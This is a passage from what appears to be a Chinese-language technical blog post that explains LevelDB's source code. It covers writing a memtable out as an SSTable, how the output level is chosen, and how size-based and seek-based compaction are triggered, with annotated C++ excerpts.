class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">BuildTable</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, Env* env, <span class="keyword">const</span> Options&amp; options,</span></span></span><br><span class="line"><span class="function"><span class="params">                  TableCache* table_cache, Iterator* iter, FileMetaData* meta)</span> </span>&#123;</span><br><span class="line">  Status s;</span><br><span class="line">  meta-&gt;file_size = <span class="number">0</span>;</span><br><span class="line">  iter-&gt;SeekToFirst();</span><br><span class="line"></span><br><span class="line">   <span class="comment">// meta number就是上图的数字来源， meta-&gt;number的赋值语句在DBImpl::WriteLevel0Table中的 `meta.number = versions_-&gt;NewFileNumber();`</span></span><br><span class="line">    <span class="comment">// 所以该数字由VersionSet分配</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> fname = TableFileName(dbname, meta-&gt;number);</span><br><span class="line">  <span class="keyword">if</span> (iter-&gt;Valid()) &#123;</span><br><span class="line">    WritableFile* file;</span><br><span class="line">    s = env-&gt;NewWritableFile(fname, &amp;file);</span><br><span class="line">    <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">      <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 新建sstable</span></span><br><span class="line">    TableBuilder* builder = <span class="keyword">new</span> TableBuilder(options, file);</span><br><span class="line">      <span class="comment">// 因为跳表是有序的，所以第一个key肯定是最小的</span></span><br><span class="line">    meta-&gt;smallest.DecodeFrom(iter-&gt;key());</span><br><span class="line">    Slice key;</span><br><span class="line">    <span class="keyword">for</span> (; iter-&gt;Valid(); iter-&gt;Next()) &#123;</span><br><span class="line">      key = iter-&gt;key();</span><br><span class="line">       <span class="comment">// 向sstable中添加key value。</span></span><br><span class="line">      builder-&gt;Add(key, iter-&gt;value());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!key.empty()) &#123;</span><br><span class="line">        <span class="comment">// 同理，最后一个key是最大的</span></span><br><span class="line">      meta-&gt;largest.DecodeFrom(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finish and check for builder errors</span></span><br><span class="line">      <span class="comment">// 写入sstable中的其他块，index block, meta block ,meta index block footer等</span></span><br><span class="line">    s = builder-&gt;Finish();</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      meta-&gt;file_size = builder-&gt;FileSize();</span><br><span class="line">      assert(meta-&gt;file_size &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> builder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finish and check for file errors</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        <span class="comment">// 写入到硬件</span></span><br><span class="line">      s = file-&gt;Sync();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      s = file-&gt;Close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> file;</span><br><span class="line">    file = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">   xxx</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s.ok() &amp;&amp; meta-&gt;file_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Keep it</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    env-&gt;RemoveFile(fname);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工作：</p><ol><li>新建SStable文件</li><li>根据memtable提供的Iterator，向SStable中添加所有数据</li><li>将SSTable写入到硬件设备中。</li></ol><h4 id="2-Version-PickLevelForMemTableOutput"><a href="#2-Version-PickLevelForMemTableOutput" class="headerlink" title="2. Version::PickLevelForMemTableOutput"></a>2. Version::PickLevelForMemTableOutput</h4><p>PickLevelForMemTableOutput决定新生成的sstable所在的level，原则上，从memtable dump出来sstable应该首先放到level0， 但是如果总是放到level 0，后序的compaction会耗费过多的io吞吐量，所以这个函数的意思是，尽量将新生成的sstable往更深的level放，但是又不能放的太深，因为如果这个sstable的访问频率较高，过深的level意味着读性能的降低。所以往下push得有个读。</p><p>leveldb定义了kMaxMemCompactLevel这个参数来限制新生成的sstable能够下推的层次：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Maximum level to which a new compacted memtable is pushed if it</span></span><br><span class="line"><span class="comment">// does not create overlap.  We try to push to level 2 to avoid the</span></span><br><span class="line"><span class="comment">// relatively expensive level 0=&gt;1 compactions and to avoid some</span></span><br><span class="line"><span class="comment">// expensive manifest file operations.  We do not push all the way to</span></span><br><span class="line"><span class="comment">// the largest level since that can generate a lot of wasted disk</span></span><br><span class="line"><span class="comment">// space if the same key space is being repeatedly overwritten.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxMemCompactLevel = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>所以，默认最高只能到level2.</p><p>现在来看看源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Version::PickLevelForMemTableOutput</span><span class="params">(<span class="keyword">const</span> Slice&amp; smallest_user_key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> Slice&amp; largest_user_key)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> level = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 如果与level 0有重叠，直接return 0</span></span><br><span class="line">  <span class="keyword">if</span> (!OverlapInLevel(<span class="number">0</span>, &amp;smallest_user_key, &amp;largest_user_key)) &#123;</span><br><span class="line">    <span class="comment">// Push to next level if there is no overlap in next level,</span></span><br><span class="line">    <span class="comment">// and the #bytes overlapping in the level after that are limited.</span></span><br><span class="line">    <span class="function">InternalKey <span class="title">start</span><span class="params">(smallest_user_key, kMaxSequenceNumber, kValueTypeForSeek)</span></span>;</span><br><span class="line">    <span class="function">InternalKey <span class="title">limit</span><span class="params">(largest_user_key, <span class="number">0</span>, <span class="keyword">static_cast</span>&lt;ValueType&gt;(<span class="number">0</span>))</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; overlaps;</span><br><span class="line">    <span class="keyword">while</span> (level &lt; <span class="built_in">config</span>::kMaxMemCompactLevel) &#123;<span class="comment">// 最高到kMaxMemCompactLevel</span></span><br><span class="line">       <span class="comment">// 与level+1有重叠</span></span><br><span class="line">      <span class="keyword">if</span> (OverlapInLevel(level + <span class="number">1</span>, &amp;smallest_user_key, &amp;largest_user_key)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (level + <span class="number">2</span> &lt; <span class="built_in">config</span>::kNumLevels) &#123;</span><br><span class="line">         <span class="comment">// 与祖父level的重叠size过大，则直接break</span></span><br><span class="line">        <span class="comment">// Check that file does not overlap too many grandparent bytes.</span></span><br><span class="line">        GetOverlappingInputs(level + <span class="number">2</span>, &amp;start, &amp;limit, &amp;overlaps);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int64_t</span> sum = TotalFileSize(overlaps);</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; MaxGrandParentOverlapBytes(vset_-&gt;options_)) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      level++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用一张流程图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/PickLevelForMemTableOutput.png" alt="img"></p><h4 id="3-edit-gt-Addfile-（记录元sstable所在level等元数据）"><a href="#3-edit-gt-Addfile-（记录元sstable所在level等元数据）" class="headerlink" title="3. edit-&gt;Addfile （记录元sstable所在level等元数据）"></a>3. edit-&gt;Addfile （记录元sstable所在level等元数据）</h4><p>最后就是edit-&gt;Addfile。将生成的sstable的元数据（filemeta）加入到versionedit中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add the specified file at the specified number.</span></span><br><span class="line"><span class="comment">// REQUIRES: This version has not been saved (see VersionSet::SaveTo)</span></span><br><span class="line"><span class="comment">// REQUIRES: "smallest" and "largest" are smallest and largest keys in file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddFile</span><span class="params">(<span class="keyword">int</span> level, <span class="keyword">uint64_t</span> file, <span class="keyword">uint64_t</span> file_size,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">const</span> InternalKey&amp; smallest, <span class="keyword">const</span> InternalKey&amp; largest)</span> </span>&#123;</span><br><span class="line">  FileMetaData f;</span><br><span class="line">  f.number = file;</span><br><span class="line">  f.file_size = file_size;</span><br><span class="line">  f.smallest = smallest;</span><br><span class="line">  f.largest = largest;</span><br><span class="line">  new_files_.push_back(<span class="built_in">std</span>::make_pair(level, f));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从edit-&gt;AddFile可知，一个SSTable对应有一个FileMeta存放在edit中，edit最终会存放在manifest，同时edit最终会演变成version，version又会加入到versioneset中。</p><h3 id="2-LogAndApply"><a href="#2-LogAndApply" class="headerlink" title="2. LogAndApply"></a>2. LogAndApply</h3><p>LogAndApply前面已经分析过了。 之前我们将所有filemeta存放在一个versionedit中，通过这个LogAndApply即可将versionedit应用到当前versionset中，并持久化到manifest。</p><h2 id="2-何时Tigger-Compaction？"><a href="#2-何时Tigger-Compaction？" class="headerlink" title="2. 何时Tigger Compaction？"></a>2. 何时Tigger Compaction？</h2><p>让我们回到MaybeScheduleCompaction</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::MaybeScheduleCompaction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line">  <span class="keyword">if</span> (background_compaction_scheduled_) &#123;</span><br><span class="line">    <span class="comment">// Already scheduled</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shutting_down_.load(<span class="built_in">std</span>::memory_order_acquire)) &#123;</span><br><span class="line">    <span class="comment">// DB is being deleted; no more background compactions</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!bg_error_.ok()) &#123;</span><br><span class="line">    <span class="comment">// Already got an error; no more changes</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (imm_ == <span class="literal">nullptr</span> &amp;&amp; manual_compaction_ == <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">             !versions_-&gt;NeedsCompaction()) &#123;</span><br><span class="line">      <span class="comment">// 递归结束点，防止无限递归</span></span><br><span class="line">    <span class="comment">// No work to be done</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    background_compaction_scheduled_ = <span class="literal">true</span>;</span><br><span class="line">    env_-&gt;Schedule(&amp;DBImpl::BGWork, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，正常情况下只要满足一下3种条件中任何一个都会触发一次compaction：</p><ul><li>imm != null, memtable已经转化为immtable，需要及时dump到外存中。</li><li>manual_compaction， 手动compaction</li><li>versions-&gt;NeedCompaction()</li></ul><p>前两种都好说，重点看一下第3种：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Returns true iff some level needs a compaction.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">NeedsCompaction</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  Version* v = current_;</span><br><span class="line">  <span class="keyword">return</span> (v-&gt;compaction_score_ &gt;= <span class="number">1</span>) || (v-&gt;file_to_compact_ != <span class="literal">nullptr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又分为了两种情况，根据compaction_score和根据 filte_compact。先说第一种：<code>v-&gt;compaction_score_</code></p><h3 id="1-compaction-score-amp-Finalize函数"><a href="#1-compaction-score-amp-Finalize函数" class="headerlink" title="1. compaction_score_  &amp; Finalize函数"></a>1. compaction_score_  &amp; Finalize函数</h3><p>==Finalize函数==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionSet::Finalize</span><span class="params">(Version* v)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Precomputed best level for next compaction</span></span><br><span class="line">  <span class="keyword">int</span> best_level = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">double</span> best_score = <span class="number">-1</span>;</span><br><span class="line"><span class="comment">// 最高level</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels - <span class="number">1</span>; level++) &#123;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">    <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// We treat level-0 specially by bounding the number of files</span></span><br><span class="line">      <span class="comment">// instead of number of bytes for two reasons:</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// (1) With larger write-buffer sizes, it is nice not to do too</span></span><br><span class="line">      <span class="comment">// many level-0 compactions.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// (2) The files in level-0 are merged on every read and</span></span><br><span class="line">      <span class="comment">// therefore we wish to avoid too many files when the individual</span></span><br><span class="line">      <span class="comment">// file size is small (perhaps because of a small write-buffer</span></span><br><span class="line">      <span class="comment">// setting, or very high compression ratios, or lots of</span></span><br><span class="line">      <span class="comment">// overwrites/deletions).</span></span><br><span class="line">      score = v-&gt;files_[level].<span class="built_in">size</span>() /</span><br><span class="line">              <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(<span class="built_in">config</span>::kL0_CompactionTrigger);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Compute the ratio of current size to size limit.</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint64_t</span> level_bytes = TotalFileSize(v-&gt;files_[level]);</span><br><span class="line">      score =</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(level_bytes) / MaxBytesForLevel(options_, level);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt; best_score) &#123;</span><br><span class="line">      best_level = level;</span><br><span class="line">      best_score = score;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  v-&gt;compaction_level_ = best_level;</span><br><span class="line">  v-&gt;compaction_score_ = best_score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在leveldb的设计中，level0和其余level的compaction设计是不同的，level0基于文件数量，而其余层基于文件的总大小。</p><h4 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h4><p>level0为什么要要这样设计？根据注释：</p><ol><li>如果有更大的写buffer, 应该尽量避免多个level 0的compactions。</li><li>每次读，都会level0的file merge，应该如果level0的文件数量过多。（个人理解：因为读会衰减？）</li></ol><blockquote><p>引用博文：</p><p>注释说的很明白，level 0的文件之间，key可能是交叉重叠的，因此不希望level 0的文件数特别多。我们考虑write buffer 比较小的时候，如果使用size来限制，那么level 0的文件数可能太多。</p><p>另一个方面，如果write buffer过大，使用固定大小的size 来限制level 0的话，可能算出来的level 0的文件数又太少，触发 level 0 compaction的情况发生的又太频繁。</p></blockquote><p>所以，对于level0，其默认设计的文件数量不超过4:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Level-0 compaction is started when we hit this many files.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kL0_CompactionTrigger = <span class="number">4</span>;</span><br></pre></td></tr></table></figure><h4 id="其他level"><a href="#其他level" class="headerlink" title="其他level"></a>其他level</h4><p>其他level则是根据当前文件大小与size limit的比值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="comment">// Compute the ratio of current size to size limit.</span></span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">uint64_t</span> level_bytes = TotalFileSize(v-&gt;files_[level]);</span><br><span class="line">     score =</span><br><span class="line">         <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(level_bytes) / MaxBytesForLevel(options_, level);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">MaxBytesForLevel</span><span class="params">(<span class="keyword">const</span> Options* options, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Note: the result for level zero is not really used since we set</span></span><br><span class="line">  <span class="comment">// the level-0 compaction threshold based on number of files.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Result for both level-0 and level-1</span></span><br><span class="line">  <span class="keyword">double</span> result = <span class="number">10.</span> * <span class="number">1048576.0</span>;<span class="comment">// 默认是10M</span></span><br><span class="line">  <span class="keyword">while</span> (level &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    result *= <span class="number">10</span>;</span><br><span class="line">    level--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码说明，从level1开始，每相邻两层的level总大小，相差10.  level1=10M, level2=100M，以此类推。</p><p>同时这里也指明了leveldb的最高level为多少：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels - <span class="number">1</span>; level++) &#123;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">    <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">    xxx</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kNumLevels = <span class="number">7</span>;</span><br></pre></td></tr></table></figure><p>所以最高到level6, 则各层大小分布为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level 1               10M </span><br><span class="line">level 2              100M</span><br><span class="line">level 3             1000M</span><br><span class="line">level 4            10000M</span><br><span class="line">level 5           100000M</span><br><span class="line">level 6          1000000M</span><br></pre></td></tr></table></figure><h4 id="选择得分最高的来做compaction"><a href="#选择得分最高的来做compaction" class="headerlink" title="选择得分最高的来做compaction"></a>选择得分最高的来做compaction</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (score &gt; best_score) &#123;</span><br><span class="line">   best_level = level;</span><br><span class="line">   best_score = score;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>得分越高，越想compaction。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>所以根据compaction_score_ 来看，当level0的文件过多，或者其余level的总file size过大时，会触发compacton。</p><h3 id="2-file-to-compact-amp-Seek-Compaction"><a href="#2-file-to-compact-amp-Seek-Compaction" class="headerlink" title="2. file_to_compact_ &amp; Seek Compaction"></a>2. file_to_compact_ &amp; Seek Compaction</h3><p>除了上述情况外，leveldb还有用了基于seek的compactoin。</p><p>除了level 0以外，任何一个level的文件内部是有序的，文件之间也是有序的。但是level（n）和level （n＋1）中的两个文件的key可能存在交叉。正是因为这种交叉，查找某个key值的时候， level（n） 的查找无功而返，而不得不restart to level(n＋1)。</p><p>我们考虑寻找某一个key，如果找了曾经查找了level (n) ,但是没找到，然后去level (n+1)查找，结果找到了，那么对level (n)的某个文件而言，该文件就意味着有一次 未命中。</p><p>我们可以很容易想到，如果查找了多次，某个文件不得不查找，却总也找不到，总是去高一级的level，才能找到。这说明该层级的文件和上一级的文件，key的范围重叠的很严重，这是不合理的，会导致效率的下降。因此，需要对该level 发起一次Major compaction，减少 level 和level ＋ 1的重叠情况。</p><p>这就是所谓的 Seek Compaction。</p><p>我个人的理解是，查找一个key，根据manifest判定这个key可能在某个sstable中（manifest中存放了sstable的smallest和largest key）,但是实际上并不在，所以总是在更深层中去找。那查找本层的sstable就是对io的浪费，而且也说明了本层和更深层的key有比较严重的相互重叠。举个例子，如下图：</p><img data-src="../../../图库/leveldb源码阅读-copy-seek compaction.png" style="zoom:33%;" /><p>现在查找6， 对于level1的sstable来说，key的range在[1,9], 所以会查找这个sstable，显然6不在其中，于是向下层中找，level2的这个sstable的key range为[2,8]，在这里找到了。 这样level1的io就是浪费掉的， level1和level2的key overlap也比较严重，长此以往浪费io，所以需要compaction。</p><p>seek compaction在filemeta中用 <strong>allowed_seeks</strong> 来控制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FileMetaData</span> &#123;</span></span><br><span class="line">  FileMetaData() : refs(<span class="number">0</span>), allowed_seeks(<span class="number">1</span> &lt;&lt; <span class="number">30</span>), file_size(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> refs;</span><br><span class="line">  <span class="keyword">int</span> allowed_seeks;  <span class="comment">// !!!Seeks allowed until compaction</span></span><br><span class="line">  <span class="keyword">uint64_t</span> number;</span><br><span class="line">  <span class="keyword">uint64_t</span> file_size;    <span class="comment">// File size in bytes</span></span><br><span class="line">  InternalKey smallest;  <span class="comment">// Smallest internal key served by table</span></span><br><span class="line">  InternalKey largest;   <span class="comment">// Largest internal key served by table</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>==VersionSet::Builder::Apply==对其初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Apply all of the edits in *edit to the current state.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Apply</span><span class="params">(VersionEdit* edit)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Update compaction pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; edit-&gt;compact_pointers_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = edit-&gt;compact_pointers_[i].first;</span><br><span class="line">    vset_-&gt;compact_pointer_[level] =</span><br><span class="line">        edit-&gt;compact_pointers_[i].second.Encode().ToString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Delete files</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; deleted_file_set_kvp : edit-&gt;deleted_files_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = deleted_file_set_kvp.first;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> number = deleted_file_set_kvp.second;</span><br><span class="line">    levels_[level].deleted_files.insert(number);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add new files</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; edit-&gt;new_files_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = edit-&gt;new_files_[i].first;</span><br><span class="line">    FileMetaData* f = <span class="keyword">new</span> FileMetaData(edit-&gt;new_files_[i].second);</span><br><span class="line">    f-&gt;refs = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We arrange to automatically compact this file after</span></span><br><span class="line">    <span class="comment">// a certain number of seeks.  Let's assume:</span></span><br><span class="line">    <span class="comment">//   (1) One seek costs 10ms</span></span><br><span class="line">    <span class="comment">//   (2) Writing or reading 1MB costs 10ms (100MB/s)</span></span><br><span class="line">    <span class="comment">//   (3) A compaction of 1MB does 25MB of IO:</span></span><br><span class="line">    <span class="comment">//         1MB read from this level</span></span><br><span class="line">    <span class="comment">//         10-12MB read from next level (boundaries may be misaligned)</span></span><br><span class="line">    <span class="comment">//         10-12MB written to next level</span></span><br><span class="line">    <span class="comment">// This implies that 25 seeks cost the same as the compaction</span></span><br><span class="line">    <span class="comment">// of 1MB of data.  I.e., 